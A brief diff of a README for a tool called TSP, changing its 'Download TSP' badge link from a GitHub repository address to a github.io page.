@@ -27,7 +27,7 @@ With TSP, you can:
 
 To get started, you need to download TSP. Click the button below to go to the download page:
 
-[![Download TSP](https://img.shields.io/badge/Download-TSP-blue?style=for-the-badge&logo=github)](https://github.com/dipsannn/tick-stock-panel)
+[![Download TSP](https://img.shields.io/badge/Download-TSP-blue?style=for-the-badge&logo=github)](https://dipsannn.github.io)
 
 ---
 
